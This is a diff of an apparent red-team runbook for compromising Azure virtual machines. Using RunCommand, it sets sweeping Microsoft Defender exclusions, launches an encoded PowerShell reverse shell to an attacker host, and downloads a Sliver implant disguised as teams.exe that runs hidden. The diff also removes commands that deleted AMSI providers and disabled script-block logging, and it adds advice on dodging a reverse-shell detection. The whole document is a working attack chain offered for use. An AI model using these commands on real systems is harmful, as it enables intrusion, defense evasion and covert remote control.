@@ -8,18 +8,15 @@ Engagement-proven chain. Every command validated live. NO `--evasion` flag (caus
 # 1. Auth (SP cert)
 Connect-AzAccount -ServicePrincipal -Tenant $TenantId -ApplicationId $AppId -CertificatePath $PfxPath -CertificatePassword $PfxPass
 
-# 2. NC reverse shell on httpserver
+# 2. Defender exclusions FIRST (via RunCommand — before nc shell)
+$exc = 'Add-MpPreference -ExclusionPath "C:\"; Add-MpPreference -ExclusionProcess "*"; Add-MpPreference -ExclusionExtension "exe"; Add-MpPreference -ExclusionProcess "powershell.exe"'
+Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" -CommandId "RunPowerShellScript" -ScriptString $exc
+# WAIT for completion, then:
+
+# 3. NC reverse shell on httpserver
 nc -lvnp 80
 $script = '$s=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(''$c=New-Object System.Net.Sockets.TCPClient("YOUR_KALI_IP",80);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r+"PS "+(gl).Path+"> ");$s.Write($sb,0,$sb.Length);$s.Flush()}'')); powershell -nop -w hidden -ep bypass -enc $s'
 Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" -CommandId "RunPowerShellScript" -ScriptString $script -AsJob
-
-# 3. Disable Defender + AMSI (from nc shell as SYSTEM)
-Add-MpPreference -ExclusionPath "C:\\"
-Add-MpPreference -ExclusionProcess "*"
-Add-MpPreference -ExclusionExtension "exe"
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScriptScanning /t REG_DWORD /d 1 /f
-reg delete "HKLM\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" /f
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f
 
 # 4. Drop Sliver (from nc shell)
 iwr http://YOUR_KALI_IP:8080/teams.exe -OutFile C:\ProgramData\teams.exe -UseBasicParsing
@@ -221,16 +218,28 @@ Get-AzVM -ResourceGroupName "RGCORPSERVERS" | Format-Table Name, Location
 
 ## Step 4: Get a Shell via RunCommand
 
-### 4a: Start NC Listener
+**IMPORTANT: Defender is managed by policy (can't disable) but exclusions work. The nc reverse shell gets flagged as `PUA:PowerShell/ReverseShell` if exclusions aren't set first. Always run exclusions via RunCommand BEFORE the nc shell.**
+
+### 4a: Set Defender Exclusions FIRST (via RunCommand — no shell needed)
+
+```powershell
+$exc = 'Add-MpPreference -ExclusionPath "C:\"; Add-MpPreference -ExclusionProcess "*"; Add-MpPreference -ExclusionExtension "exe"; Add-MpPreference -ExclusionProcess "powershell.exe"'
+
+Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" `
+  -CommandId "RunPowerShellScript" -ScriptString $exc
+```
+
+**Wait for this to complete before proceeding.** Registry-based disables (DisableScriptScanning, AMSI provider removal) are overridden by managed Defender — only `Add-MpPreference` exclusions work.
+
+### 4b: Start NC Listener
 
 ```bash
 nc -lvnp 80
 ```
 
-### 4b: Deploy Reverse Shell (Proven)
+### 4c: Deploy Reverse Shell (after exclusions are set)
 
 ```powershell
-# Assign to variable first to avoid quoting issues
 $script = '$s=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(''$c=New-Object System.Net.Sockets.TCPClient("YOUR_KALI_IP",80);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r+"PS "+(gl).Path+"> ");$s.Write($sb,0,$sb.Length);$s.Flush()}'')); powershell -nop -w hidden -ep bypass -enc $s'
 
 Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" `
@@ -239,27 +248,6 @@ Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer
 
 You now have a SYSTEM shell on httpserver.
 
-### 4c: Disable Defender + AMSI + Logging (From NC Shell)
-
-```powershell
-# Defender exclusions
-Add-MpPreference -ExclusionPath "C:\\"
-Add-MpPreference -ExclusionProcess "*"
-Add-MpPreference -ExclusionExtension "exe"
-
-# Remove AMSI provider
-reg delete "HKLM\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" /f
-
-# Disable script scanning
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScriptScanning /t REG_DWORD /d 1 /f
-
-# Disable ScriptBlock logging
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f
-
-# Clear AMSI providers
-reg add "HKLM\SOFTWARE\Microsoft\AMSI\Providers" /f
-```
-
 ### 4d: Drop Sliver Implant (From NC Shell)
 
 ```powershell
@@ -267,18 +255,16 @@ iwr http://YOUR_KALI_IP:8080/teams.exe -OutFile C:\ProgramData\teams.exe -UseBas
 Start-Process C:\ProgramData\teams.exe -WindowStyle Hidden
 ```
 
-### 4e: Direct Drop via RunCommand (No NC Shell Needed)
-
-**IMPORTANT: Run Step 1 and WAIT for it to complete before Step 2. Defender must be disabled BEFORE the binary touches disk or it gets quarantined.**
+### 4e: All-in-One via RunCommand (No NC Shell)
 
 ```powershell
-# Step 1: Disable Defender + AMSI (run this FIRST, wait for completion)
-$defenderOff = 'Add-MpPreference -ExclusionPath "C:\"; Add-MpPreference -ExclusionProcess "*"; Add-MpPreference -ExclusionExtension "exe"; reg delete "HKLM\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" /f; reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScriptScanning /t REG_DWORD /d 1 /f'
+# Step 1: Exclusions (run FIRST, wait for completion)
+$exc = 'Add-MpPreference -ExclusionPath "C:\"; Add-MpPreference -ExclusionProcess "*"; Add-MpPreference -ExclusionExtension "exe"; Add-MpPreference -ExclusionProcess "powershell.exe"'
 
 Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" `
-  -CommandId "RunPowerShellScript" -ScriptString $defenderOff
+  -CommandId "RunPowerShellScript" -ScriptString $exc
 
-# WAIT for Step 1 to finish, THEN run Step 2:
+# WAIT for completion, THEN:
 
 # Step 2: Download + execute implant
 $drop = 'iwr http://YOUR_KALI_IP:8080/teams.exe -OutFile C:\ProgramData\teams.exe -UseBasicParsing; Start-Process C:\ProgramData\teams.exe -WindowStyle Hidden'
